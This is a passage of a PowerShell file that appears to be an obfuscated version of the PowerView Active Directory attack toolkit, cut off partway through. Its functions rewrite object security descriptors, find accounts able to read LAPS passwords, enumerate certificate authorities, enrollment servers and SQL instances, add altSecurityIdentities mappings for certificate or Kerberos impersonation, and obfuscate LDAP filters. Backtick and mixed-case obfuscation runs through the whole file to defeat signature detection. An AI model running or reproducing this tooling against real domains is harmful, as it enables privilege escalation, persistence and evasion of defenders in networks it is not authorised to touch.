                        ${R`es`TOretAR`gets}.Add(${_}.ObjectSID, ${_}.ObjectSDDL)
                    }
                }
                catch {
                    wRite-war`Ni`NG "[Set-DomainObjectSD] Unable to read $InputFile"
                }
                ${reStOreT`A`R`g`ets}.keys | gEt-i`D`e`NTitY`F`Ilt`eRsTrINg | foreAC`H`-obj`Ect {
                    ${FiLT`ER} += ${_}
                }
            } 
            elseif (${i`deNtITy} -and ${Sdd`ls`Tr`Ing}) {
                wri`T`e`-v`ErBOsE "[Set-DomainObjectSD] Setting provided identities: $Identity"
                ${i`De`Nt`ITY} | g`et-I`D`eN`TiTyfIL`TErstr`iNg | for`EAch-`o`Bj`ECT {
                    ${F`iLt`ER} += ${_}
                }
            }
            if (${F`Il`TEr}) {
                ${SEa`RC`hER}.filter = "(|$Filter)"
                ${ReSu`LTs} = ${S`EaRCHer}.FindAll()
                ${RESU`l`Ts} | wh`Er`e`-OBJEct {${_}} | FoR`EAch`-oBJeCT {
                    ${Ob`jeCT} = ${_}

                    if (${Ob`Je`CT}.Properties.objectsid -and ${OB`je`ct}.Properties.objectsid[0]) {
                        ${OB`j`EcTsid} = (n`eW-o`BjECt sYsT`e`M.S`eCUr`It`y`.`pRinCipal.s`e`cU`RIt`yIdeNTIfIEr(${Ob`J`EcT}.Properties.objectsid[0],0)).Value
                    }
                    else {
                        ${Ob`jEcts`id} = ${n`ULL}
                    }
                    if (${PSB`O`U`NdpARAMETeRs}['InputFile']) {
                        ${sD`dlS`TR`iNg} = ${rE`STORe`TaRg`ETS}.${OB`jEc`TsiD}
                    }

                    
                    wri`TE-vER`BOSe "[Set-DomainObjectSD] Building raw SD from SDDL string: $SDDLString"
                    ${sD} = NEw-`o`BjEct s`eCURi`Ty.A`cc`EssConTROl.`RAw`s`eCUriT`y`DE`sCRiP`ToR -ArgumentList ${SDD`Lst`RinG}
                    ${s`d`Bytes} = NEW-OB`Je`Ct byt`e[] (${s`D}.BinaryLength)
                    ${s`d}.GetBinaryForm(${S`dBY`TeS}, 0)

                    ${E`NtRy} = ${O`BJeCt}.GetDirectoryEntry()
                    try {
                        w`R`iTE-Verbo`se "[Set-DomainObjectSD] Setting 'ntsecuritydescriptor' to '$SDBytes' for object '$($Object.Properties.samaccountname)'"
                        ${eN`TRy}.InvokeSet('ntsecuritydescriptor', ${sDby`T`ES})
                        ${E`Nt`Ry}.commitchanges()
                    }
                    catch {
                        WRiTE`-`wAr`N`ING "[Set-DomainObjectSD] Error setting security descriptor for object '$($Object.Properties.samaccountname)' : $SDBytes"
                        WRITE`-WA`R`NinG "[Set-DomainObjectSD] Make sure you have Owner privileges"
                    }

                }
            }
        }
    }

}

function G`et-DO`MaIn`dN {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType([String])]
    [CmdletBinding()]
    Param(
        [ValidateNotNullOrEmpty()]
        [String]
        ${do`mA`in},

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        ${s`eRVER},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${crE`DEn`TiAL} = [Management.Automation.PSCredential]::Empty,

        [Switch]
        ${s`sl},

        [Switch]
        ${obfu`S`cAtE}
    )

    ${S`E`Arche`R`ArG`UMENts} = @{
        'LDAPFilter' = '(userAccountControl:1.2.840.113556.1.4.803:=8192)'
    }
    if (${PSBOu`Nd`pa`RAM`etERs}['Domain']) { ${sE`Ar`cH`eRargu`mEnTs}['Domain'] = ${do`M`AiN} }
    if (${p`s`B`oUnDPARam`ET`ERS}['Server']) { ${seARchERa`RGu`M`EnTs}['Server'] = ${se`R`VeR} }
    if (${Psbo`UNDpAr`AM`ETeRs}['Credential']) { ${seArCHErar`GU`me`NTS}['Credential'] = ${cr`eDEn`Ti`AL} }
    if (${P`sboU`N`dp`ARametErs}['SSL']) { ${SEA`RChER`ARGuMe`NTS}['SSL'] = ${S`sL} }
    if (${PSbOU`NDpa`RameT`E`Rs}['Obfuscate']) {${SEar`C`h`ErARGu`meN`TS}['Obfuscate'] = ${oB`FUsCa`Te} }

    if (${P`sBO`UnDP`ARAm`EterS}['Domain']) {
        ${D`OM`A`iNDN} = "DC=$($Domain -replace '\.',',DC=')"
    }
    else {
        ${DC`Dn} = get-`d`omaIn`cOmpU`TEr @SearcherArguments -FindOne | se`Le`Ct-OBject -First 1 -ExpandProperty D`ist`inguis`heDNA`me

        if (${Dc`dn}) {
            ${D`oMai`NdN} = ${Dc`dn}.SubString(${dC`dn}.IndexOf(',DC=')+1)
        }
        else {
            writ`e-ver`B`o`se "[Get-DomainDN] Error extracting domain DN for '$Domain'"
        }
    }
    if (${dOmA`In`DN}) {
        ${d`OmaI`NDN}
    }
    else {
        wr`Ite`-`VERbOse "[Get-DomainDN] Error resolving domain DN for '$Domain'"
    }
}

function G`ET-dOMaInLAP`s`REa`DerS {

    [OutputType([PSObject])]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, ValueFromPipeline = ${tr`UE}, ValueFromPipelineByPropertyName = ${tR`Ue})]
        [Alias('SamAccountName', 'Name', 'DNSHostName')]
        [String[]]
        ${IDE`NTI`Ty},

        [ValidateNotNullOrEmpty()]
        [String]
        ${DO`ma`in},

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        ${L`DaPFIL`TER},

        [ValidateNotNullOrEmpty()]
        [String[]]
        ${p`RoP`eRtIes},

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        ${Sear`CH`B`ASE},

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        ${seR`VER},

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        ${s`eAR`C`hScOPE} = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        ${r`Es`Ul`TPAGEsI`Ze} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${SeRVertIMe`Li`M`iT},

        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        ${s`ecuRiT`Y`MasKS},

        [Switch]
        ${ToM`B`STonE},

        [Alias('ReturnOne')]
        [Switch]
        ${FI`N`DONE},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${cRED`e`Ntial} = [Management.Automation.PSCredential]::Empty
    )


    BEGIN {
        ${SEAr`c`HErarGum`E`NTs} = @{}
        if (${PSBo`Und`paR`AMEt`Ers}['Domain']) { ${Sea`Rche`RarG`Um`E`NtS}['Domain'] = ${D`omA`In} }
        if (${P`SB`o`UNdPARAmEteRS}['Properties']) { ${seA`Rcher`AR`GUmE`NTs}['Properties'] = ${pr`oPeR`TI`ES} }
        if (${PSb`OU`Nd`PAr`Amet`eRS}['SearchBase']) { ${seA`RChERaR`GUM`enTS}['SearchBase'] = ${sE`AR`cHBASE} }
        if (${P`sbOUn`Dpa`RamE`TeRS}['Server']) { ${SearcH`e`RA`Rgum`eNtS}['Server'] = ${S`e`RVER} }
        if (${psB`ou`NDp`A`RamET`ERs}['SearchScope']) { ${sE`ARch`ERaRgUmE`NTS}['SearchScope'] = ${SE`ArcHsc`O`Pe} }
        if (${pS`BoU`N`dPAR`AmET`ERS}['ResultPageSize']) { ${SE`Arc`heR`AR`GuMe`NtS}['ResultPageSize'] = ${rES`UL`TPAgeSI`zE} }
        if (${pSBo`UNDpAR`A`m`etERS}['ServerTimeLimit']) { ${s`eArC`He`R`ArGUMe`NTS}['ServerTimeLimit'] = ${s`eRV`Er`T`IMe`lIMiT} }
        if (${Ps`BouNDp`ArAM`Ete`Rs}['SecurityMasks']) { ${sEA`Rche`R`ARgU`mEn`Ts}['SecurityMasks'] = ${secUR`I`TYm`AS`Ks} }
        if (${PSboUnDpa`RA`m`eT`ErS}['Tombstone']) { ${SEa`RchE`RaRG`UM`EnTS}['Tombstone'] = ${toM`B`StoNE} }
        if (${PSb`ou`ND`pa`RamET`eRs}['Credential']) { ${SEaRChERA`RG`U`ments}['Credential'] = ${CREDen`TI`AL} }
        ${S`E`ARc`hEr} = Ge`T-d`OMaI`NS`ear`cHEr @SearcherArguments
    }

    PROCESS {
        ${fI`l`Ter} = ''
        ${Ac`ls} = @()
        if (!(${iDEn`T`itY})) {
            ${IdE`N`TITy} = (G`e`T`-DOMAIncOmp`UTer -HasLAPS @SearcherArguments).objectsid
        }
        ${ID`En`TiTY} | GET-d`oM`AIn`ob`JEcT`A`Cl -RightsFilter R`EaDl`APS @SearcherArguments | For`Each`-Obj`E`ct {
            if (!(${fiL`Ter}) -or (${F`iltEr} -notmatch ${_}.ObjectSID)) {
                wRIt`E-vEr`Bose "[Get-DomainLAPSReaders] Adding $($_.ObjectSID) to filter"
                ${Fi`LT`eR} += "(objectsid=$($_.ObjectSID))"
            }
            if (${fi`lt`er} -notmatch ${_}.SecurityIdentifier) {
                WRITE-`Verb`oSe "[Get-DomainLAPSReaders] Adding $($_.SecurityIdentifier) to filter"
                ${fiL`TeR} += "(objectsid=$($_.SecurityIdentifier))"
            }
            ${ac`LS} += ${_}
        }
        if (${filT`er}) {
            ${a`c`coun`Ts} = @()
            ${S`ear`cheR}.filter = "(|$Filter)"
            wriTe-`VE`Rb`ose "[Get-DomainLAPSReaders] Using filter: $($Searcher.filter)"
            ${RES`UL`Ts} = ${SeARC`heR}.FindAll()
            ${rE`SUl`TS} | WH`ER`e-Obj`ect {${_}} | F`OreaC`H`-oB`Ject {
                ${a`ccoU`NtS} += ${_}.Properties
            }

            ${A`cls} | Fo`REAch-ob`je`ct {
                ${oBjecT`s`ID} = ${_}.ObjectSID
                ${PrI`Nc`IPaLsID} = ${_}.SecurityIdentifier
                ${a`DRigH`Ts} = ${_}.ActiveDirectoryRights
                ${ob`jEcT} = ${AcC`OU`Nts} | ?{(n`Ew-oB`ject sysTeM.se`CUrITY`.prIN`CIp`Al.seCu`Ri`TYidEnT`IFIER(${_}.objectsid[0],0)).Value -eq ${ObjeCt`S`iD}}
                ${p`R`inCIPAL} = ${AcCou`N`TS} | ?{(NE`W-ob`jeCt s`ySt`E`M.`SeCUR`iTy.pRI`N`CIPAL.sEC`UR`iTyiden`Tifi`Er(${_}.objectsid[0],0)).Value -eq ${P`Ri`NC`iP`ALSid}}
                ${OuT`ObJE`cT} = n`Ew-obJ`e`ct Ps`ObJE`Ct
                if (${o`BJ`ect}) {
                    ${Ou`TObJ`E`ct} | adD`-`MeM`BEr "ObjectName" ${obje`ct}.samaccountname[0]
                    ${oU`T`oBJEcT} | adD`-me`MbER "ObjectType" (${Ob`jE`CT}.samaccounttype[0] -as ${sa`m`ACCoU`NTtYPE`En`Um})
                }
                ${o`UtoB`JEcT} | A`dD-m`emBEr "ObjectSID" ${oBjE`cT`SiD}
                ${OuT`OBJe`CT} | ADd-mEm`B`ER "ActiveDirectoryRights" ${aD`R`ightS}
                if (${pRIN`cIp`Al}) {
                    ${OU`To`BJECT} | a`DD-m`eM`BEr "PrincipalName" ${PR`IN`CipAL}.samaccountname[0]
                    ${O`UTo`BJ`ECt} | adD`-m`EMbEr "PrincipalType" (${P`R`INcip`AL}.samaccounttype[0] -as ${sA`MA`C`CouNtTYpEEnuM})
                    if (${OUt`o`BJ`eCt}.PrincipalType -eq 'GROUP_OBJECT' -or ${outo`Bj`Ect}.PrincipalType -eq 'ALIAS_OBJECT') {
                       ${pri`NCiPAL`Me`MbErs}  = @()
                        ${PRIN`Ci`PAL} | gEt-D`omAInGrO`UP`MeMBER -Recurse @SearcherArguments | FO`Re`ACH`-`obJeCT {
                            ${mEMb`eR} = ${_}
                            ${MEm`BER}
                            if (${m`Ember}.MemberObjectClass -ne 'group') {
                                ${PRIN`cI`PALME`mBeRs} += ${m`eMb`eR}
                            }
                        }
                        ${O`U`TOBJecT} | adD-`M`EmBer "RecursivePrincipalMembers" ${P`RIn`C`ipalm`eMB`ERS}
                    }
                }
                ${ouTo`BjE`CT} | Ad`D`-mEMbER "PrincipalSID" ${PRi`N`CIPal`S`ID}
                ${o`UTOB`j`EcT}
            }
        }
    }
}

function geT-Dom`A`ineNrO`l`l`me`N`TsE`RVErs {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType([String])]
    [CmdletBinding()]
    Param(
        [ValidateNotNullOrEmpty()]
        [String]
        ${D`Om`AIN},

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        ${sEr`VEr},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${c`REDE`NT`iaL} = [Management.Automation.PSCredential]::Empty
    )

    ${S`E`ARc`heRArG`U`mENts} = @{}
    if (${psb`OundPa`RA`me`Te`Rs}['Domain']) { ${s`EAR`cHEra`R`GUMen`Ts}['Domain'] = ${dO`Ma`IN} }
    if (${psboundPA`RaM`E`Te`RS}['Server']) { ${s`earCh`eraR`GUMeNTs}['Server'] = ${s`er`Ver} }
    if (${p`sboU`NDpA`RAMet`ERs}['Credential']) { ${sEA`Rc`HERARG`Um`ENts}['Credential'] = ${cRE`denT`i`AL} }

    ${DOmAi`N`DN} = gE`T-d`OmAIn`dn @SearcherArguments

    if (${D`OmaIn`Dn}) {
        WritE-ve`R`BOse "[Get-DomainEnrollmentServers] Got domain DN: $DomainDN"
    }
    else {
        Wri`T`e`-VE`RBosE "[Get-DomainEnrollmentServers] Error extracting domain DN for '$Domain'"
    }

    gEt-`DOMaINo`B`Ject -SearchBase "CN=Configuration,$DomainDN" -LDAPFilter "(objectCategory=pKIEnrollmentService)" @SearcherArguments
}

function Get-DomAIN`cA`C`E`Rti`FIca`Tes {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType([String])]
    [CmdletBinding()]
    Param(
        [ValidateNotNullOrEmpty()]
        [String]
        ${d`OmA`in},

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        ${s`erVer},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${Cre`d`E`NTIal} = [Management.Automation.PSCredential]::Empty
    )

    ${s`eArcHE`RaR`gUm`EnTS} = @{}
    if (${pS`BO`UNDPA`RAMetE`Rs}['Domain']) { ${sEAr`CH`EraR`GuMeN`TS}['Domain'] = ${d`Oma`In} }
    if (${PsBOUN`DP`AraMET`Ers}['Server']) { ${Se`ARcH`E`RARgUmENTS}['Server'] = ${sERV`Er} }
    if (${pSB`OUnDP`ArAM`Et`ErS}['Credential']) { ${se`ARCh`erAr`G`UM`EnTS}['Credential'] = ${cr`EDeNtI`AL} }

    ${DOMAi`N`dN} = GET-`DomA`i`NdN @SearcherArguments

    if (${DomA`in`dN}) {
        wr`ItE-Ve`Rbose "[Get-DomainCACertificates] Got domain DN: $DomainDN"
    }
    else {
        w`R`ite-V`erBosE "[Get-DomainCACertificates] Error extracting domain DN for '$Domain'"
    }

    g`eT`-`DoMaINObje`CT -SearchBase "CN=Configuration,$DomainDN" -LDAPFilter "(objectCategory=certificationAuthority)" @SearcherArguments
}

function gET-D`o`ma`InSQl`I`N`staNCES {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType([String])]
    [CmdletBinding()]
    Param(
        [ValidateNotNullOrEmpty()]
        [String]
        ${do`maIn},

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        ${sE`RV`er},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${C`REdeN`TIAl} = [Management.Automation.PSCredential]::Empty
    )

    ${SeA`Rc`h`eRa`RGUmenTs} = @{}
    if (${P`sBounD`paRam`ETE`RS}['Domain']) { ${S`EaRCHeR`ArgumEN`TS}['Domain'] = ${DOm`A`in} }
    if (${PSBO`U`N`DparamE`TE`RS}['Server']) { ${searC`HeRArG`UM`En`Ts}['Server'] = ${SE`RVer} }
    if (${PSbOun`d`p`Ar`AMeT`ErS}['Credential']) { ${SEARC`h`ErArGum`en`TS}['Credential'] = ${CRe`dEnTI`Al} }

    ge`T-`D`OmAInobj`EcT -LDAPFilter "(serviceprincipalname=MSSQLSvc*)" @SearcherArguments | Sel`eCT -expand SeR`V`i`Cep`R`IncIPAlnA`Me | Wh`e`RE-oBjecT {
        ${_} -match "MSSQLSvc" 
    } | FO`R`EAcH-o`BjE`Ct {
        (${_} -split '/')[1] -replace ':',','
    }
}

function Ad`d-dO`maiNALT`sEc`U`RItYiden`T`ity {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType([String])]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = ${tr`Ue}, ValueFromPipelineByPropertyName = ${T`RUe})]
        [Alias('DistinguishedName', 'SamAccountName', 'Name')]
        [String[]]
        ${IdEn`T`itY},

        [ValidateSet('Certificate', 'Kerberos')]
        [String]
        ${ty`pe} = 'Certificate',

        [ValidateNotNullOrEmpty()]
        [String]
        ${iSS`UEr},

        [ValidateNotNullOrEmpty()]
        [String]
        ${sUB`jECt},

        [ValidateNotNullOrEmpty()]
        [String]
        ${AC`Cou`Nt},

        [ValidateNotNullOrEmpty()]
        [String]
        ${DOmA`iN},

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        ${sE`RVEr},

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        ${S`EARC`HbasE},

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        ${S`EaRchs`coPE} = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        ${REsULt`pAg`e`siZe} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${SEr`VErTi`MEl`Im`it},

        [Switch]
        ${t`Om`BS`TonE},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${C`R`E`DEnTiaL} = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        ${sEArcheRAr`G`U`M`EnTS} = @{}
        if (${pS`BOu`NDpaRAmET`ERs}['Domain']) { ${SE`AR`cheraR`Gu`mENts}['Domain'] = ${DOm`Ain} }
        if (${PS`B`oUNdParaMe`Te`RS}['Server']) { ${sE`Ar`cH`eraR`GuMEN`TS}['Server'] = ${s`erV`Er} }
        if (${PSbOuN`DpA`R`AMEtErS}['Credential']) { ${S`EARcHErArg`UM`EntS}['Credential'] = ${cRe`D`ENt`IAl} }
        if (${p`SBOunD`paRA`MEt`ERS}['SearchBase']) { ${sE`ARCH`ER`Arg`Um`ENts}['SearchBase'] = ${se`A`RcHBAse} }
        if (${p`sBoUNd`P`ARamEteRS}['SearchScope']) { ${sEAR`CHeRar`g`Um`E`NtS}['SearchScope'] = ${S`eAr`CHscoPe} }
        if (${PsB`ou`N`DPa`RAMETE`RS}['ResultPageSize']) { ${seArChE`RA`RGU`Me`NTs}['ResultPageSize'] = ${rEs`UltpA`gESI`Ze} }
        if (${PSBOun`dp`ArAMEt`erS}['ServerTimeLimit']) { ${seaR`CH`e`RaRgumE`Nts}['ServerTimeLimit'] = ${s`e`RvertImEl`IMIt} }
        if (${Ps`BouNDPar`A`m`etErS}['Tombstone']) { ${Searc`h`eRArGum`eNTS}['Tombstone'] = ${to`mB`StonE} }
        if (${P`sboU`NdPaRA`MET`eRs}['Credential']) { ${Se`ArCHErar`G`UmENtS}['Credential'] = ${C`Re`dEN`TIAL} }
        ${s`e`ARchEr} = GE`T-DOM`AInseA`RchER @SearcherArguments
        ${domA`INDN`ARGUm`ENTs} = @{}
        if (${PSBOu`N`DPaRaM`E`Te`RS}['Domain']) { ${D`oM`A`iNdNA`RgUmENTS}['Domain'] = ${d`om`AIN} }
        if (${PSbouNdP`AR`A`mETErS}['Server']) { ${DoMA`indNArg`UMe`NTS}['Server'] = ${sEr`V`ER} }
        if (${PS`BO`U`NdpaRam`E`Ters}['Credential']) { ${dOMAINd`NArGu`M`E`Nts}['Credential'] = ${CrE`deN`Ti`Al} }
    }


    PROCESS {
        ${FI`lt`ER} = ''
        if (${i`de`NtiTy}) {
            wR`iTe`-`VeRBO`Se "[Add-DomainAltSecurityIdentity] Setting provided identities: $Identity"
            ${iD`en`TiTy} | gET`-IdENt`I`T`yfIlT`ERS`TRINg | F`o`Re`ACH-ObjECT {
                ${F`Ilt`Er} += ${_}
            }
        }

        ${alt`I`D`StrInG} = ''
        if (${P`sb`o`UndPA`RA`MeTeRS}['Type'] -eq 'Certificate') {
            ${dOmA`IN`Dn} = geT`-doMa`iNdN @DomainDNArguments
            ${d`o`MaiNdn`spL`IT} = ${DOM`Ai`NDn} -split ','
            [array]::Reverse(${DOM`A`INDN`S`pliT})
            ${revErseDdom`A`I`N`Dn} = ${DOmAI`NDNs`Pl`It} -join ','

            ${a`L`TiDSt`RiNg} = 'X509:'
            if (${P`sbO`UNDpAraM`eTeRS}['Issuer']) {
                ${AlTiDS`Tr`i`Ng} += "<I>$ReversedDomainDN,$Issuer"
            }
            if (${PSbou`NDpARam`Ete`Rs}['Subject']) {
                ${Al`T`id`sTriNG} += "<S>$ReversedDomainDN,$Subject"
            }
            else {
                WRiTe`-er`ROr "[Add-DomainAltSecurityIdentity] Certificate altSecurityIdentity requires a Subject"
                return
            }
        }
        elseif (${P`SBouNdPAram`E`TE`Rs}['Account']) {
            ${al`TiDstr`iNG} = "Kerberos:$Account"
        }
        else {
            W`RITE-`eR`RoR "[Add-DomainAltSecurityIdentity] A -Type must be set"
            return
        }

        wRi`TE-vE`RbosE "[Add-DomainAltSecurityIdentity] Using Alternate Identity string: $AltIDString"


        if (${FIl`T`eR}) {
            ${seA`RchEr}.filter = "(|$Filter)"
            ${r`EsultS} = ${seA`Rcher}.FindAll()
            ${reS`U`lTS} | WHere`-oB`JE`Ct {${_}} | ForeAc`h`-oBjE`Ct {
                ${p`R`oPs} = ${_}.Properties
                if (${prO`Ps}.keys -contains 'altsecurityidentities') {
                    ${Al`TIDS} = ${P`R`oPs}['altsecurityidentities']
                }
                else {
                    ${Al`TIDs} = @()
                }

                ${alT`iDS} += ${AlTIdS`TR`inG}

                sET`-`DOMa`I`NObJECt ${P`RopS}['samaccountname'] -Set @{'altsecurityidentities'=${a`lTIds}}
            }
        }
    }
}

function i`NvOkE-Lda`PQ`UE`RY {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.User')]
    [OutputType('PowerView.User.Raw')]
    Param(
        [ValidateNotNullOrEmpty()]
        [String]
        ${DOma`in},

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        ${L`D`ApFILTER},

        [ValidateNotNullOrEmpty()]
        [String[]]
        ${PRopeR`T`ies},

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        ${sE`Arc`H`BASE},

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        ${s`E`RVeR},

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        ${SEArCHs`c`oPe} = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        ${R`E`sultpAG`ES`iZe} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${se`RverTiMeLi`m`IT},

        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        ${SEcuri`TYm`AskS},

        [Switch]
        ${to`M`BsTOnE},

        [Alias('ReturnOne')]
        [Switch]
        ${FiN`do`Ne},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${C`R`EDeNTIAl} = [Management.Automation.PSCredential]::Empty,

        [Switch]
        ${r`Aw},

        [Switch]
        ${s`sl},

        [Switch]
        ${obFUS`Ca`TE}
    )

    BEGIN {
        ${Sea`RCh`ERarG`Um`ENTS} = @{}
        if (${p`s`B`oUNDpaRAmeTeRS}['Domain']) { ${S`EA`RCHeRaR`g`Ume`Nts}['Domain'] = ${DOM`A`in} }
        if (${pS`B`Ou`NDP`ArAMe`TErs}['Properties']) { ${seArCh`ER`A`RgUMen`TS}['Properties'] = ${pR`o`PErTies} }
        if (${PsBoUnDp`A`RA`meTe`RS}['Owner']) { ${se`AR`ChE`RaRgumEN`TS}['Properties'] = '*' }
        if (${pSB`O`U`NDpa`RAmeTerS}['SearchBase']) { ${search`ERAR`g`UME`NTs}['SearchBase'] = ${Sear`chB`A`sE} }
        if (${PsB`OU`NDPAr`AMe`TERs}['Server']) { ${SEa`Rc`he`RAR`GuMents}['Server'] = ${SE`RV`ER} }
        if (${pSBo`U`ND`PAR`Am`EtERS}['SearchScope']) { ${seArC`HER`Ar`Gu`MENtS}['SearchScope'] = ${s`eA`R`ChSCope} }
        if (${psboU`N`d`PA`R`AMeTerS}['ResultPageSize']) { ${SE`ArchE`RArgU`mE`Nts}['ResultPageSize'] = ${R`EsUlT`PAgesIzE} }
        if (${PSbo`UnD`PARamet`erS}['ServerTimeLimit']) { ${seA`RC`HER`A`RGume`Nts}['ServerTimeLimit'] = ${s`ERver`Tim`elImit} }
        if (${ps`Bo`Undp`ARAmeTerS}['SecurityMasks']) { ${SEar`cH`ER`AR`GUmENts}['SecurityMasks'] = ${SecURItY`ma`skS} }
        if (${psBounD`Pa`RamE`TErs}['Owner']) { ${s`e`ArCher`ARguMeNtS}['SecurityMasks'] = 'Owner' }
        if (${PSb`OuNDPaRamE`T`ERS}['Tombstone']) { ${S`e`ARc`H`eRA`RGuMentS}['Tombstone'] = ${TO`MbSto`NE} }
        if (${Ps`BoUndPAR`A`ME`T`erS}['Credential']) { ${SEar`ch`ErA`Rgum`en`Ts}['Credential'] = ${C`RE`dEn`TiAL} }
    }

    PROCESS {
        if (${P`S`BOuNdpar`AmEtE`Rs}['Obfuscate']) {
            ${lDaPf`i`LTEr} = G`eT`-ObfuSca`TEdFILTE`RstRiNG -LDAPFilter ${lDap`Fi`LTEr}
        }
        if (${PS`BO`U`NDpaRaMe`T`ERS}['SSL']) {
            ${mAX`RES`ULTs`TorE`QUEst} = 1000
            ${rE`Su`LTS} = @()
            ${SE`ARcH`eR} = get-dOM`AInSe`ARCH`ER @SearcherArguments -SSL

            ${r`e`QUeST} = nEw-Ob`J`e`cT -TypeName sY`s`TEM.D`irECToRySe`R`V`icE`S.pROtoco`Ls.`SEaR`C`hre`QUEst
            ${pAGerE`Q`Uest`cOn`TrOl} = nE`W`-ObJ`ect -TypeName SYsTe`m`.`diR`ectoR`y`SErviCES.`Pro`ToCols.P`AG`ErESULtreQ`U`estCO`NtrOl -ArgumentList ${mAxreS`UL`TStOR`EqUEST}

            
            if (${P`sBO`UndP`ARAMeteRS}['SecurityMasks']) {
                ${s`d`FLaGScOnTrOL} = n`ew-Ob`JECT -TypeName SystEM`.dIrECtOr`YSER`VicES.PrO`Toco`l`s.seC`U`R`itYde`SCRiPT`OR`FLAGco`NTr`Ol -ArgumentList ${seCUri`Tym`AS`KS}
                ${r`equ`ESt}.Controls.Add(${SdFl`AGscO`N`TroL})
            }

            if (${pS`B`OU`NdpArA`mETerS}['SearchBase']) {
                ${R`eqUEST}.DistinguishedName = ${S`eArc`HBASe}
            }
            else {
                ${T`ArGe`TDo`Main} = ${SEA`R`cHeR}.SessionOptions.DomainName
                ${D`O`MaiNdN} = "DC=$($TargetDomain.Replace('.',',DC='))"
                ${Re`q`UEst}.DistinguishedName = ${D`O`mAindn}
            }
            if (${p`Sbou`N`dpAramETErS}['SearchScope']) {
                ${re`QuEST}.Scope = ${s`EaR`cHScOPe}
            }
            ${rEQ`UEsT}.Controls.Add(${pA`gErEQUEs`Tc`O`NtR`oL})
            if (${l`Da`pFiLt`eR} -and ${ldApf`i`lter} -ne '') {
                ${r`EqU`ESt}.Filter = "$LdapFilter"
            }

            while(${t`RUE}) {
                ${ReSpo`N`SE} = ${seAr`ch`Er}.SendRequest(${rE`QU`est})
                if (${r`esp`OnsE}.ResultCode -eq 'Success') {
                    foreach (${en`T`RY} in ${reSp`ON`SE}.Entries) {
                        ${ReSUl`TS} += ${ENt`RY}
                        if (${PSbOU`Ndp`Ar`Am`E`TErS}['FindOne']) {
                            break
                        }
                    }
                }
                if (${pS`BOUNdPAra`Me`TerS}['FindOne']) {
                    break
                }

                ${Pa`g`E`Resp`oNSec`ONTrOl} = [System.DirectoryServices.Protocols.PageResultResponseControl]${re`sPo`Nse}.Controls[0]
                if (${PAgERESpONs`e`C`O`NtRoL}.Cookie.Length -eq 0) {
                    break
                }
                ${PA`ger`Equ`EStco`NT`ROL}.Cookie = ${pa`GE`ResPO`N`SeC`oN`TRoL}.Cookie
            }
        }
        else {
            ${sE`ARCHeR} = G`Et`-DoM`AInseA`R`cher @SearcherArguments
            ${SEa`R`CHer}.filter = "$LDAPFilter"
            w`RItE-`V`E`RBose "[Invoke-LDAPQuery] filter string: $($Searcher.filter)"

            if (${pS`B`ouNDPAR`A`meters}['FindOne']) { ${Resul`TS} = ${S`EA`RchER}.FindOne() }
            else { ${Re`s`Ults} = ${sEa`Rc`HeR}.FindAll() }
        }
        ${rESu`L`Ts}
    }
}

function GeT-oBF`UscatE`DfILTE`R`sTRI`NG {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('String')]
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = ${T`RUE}, ValueFromPipeline = ${t`RuE})]
        [ValidateNotNullOrEmpty()]
        ${l`dapFi`Lt`ER}
    )

    wRiTE-v`E`Rb`oSE "[Get-ObfuscatedFilterString] Obfuscating filter string: $($LDAPFilter)"
    ${PaR`Ts} = ${L`d`A`pFiLter} -split '='
    ${ou`TFiLT`eR} = "$($Parts[0])="
    ${SK`Ip} = ${FaL`Se}
    if (${P`A`RTs}[0] -match 'userAccountControl') {
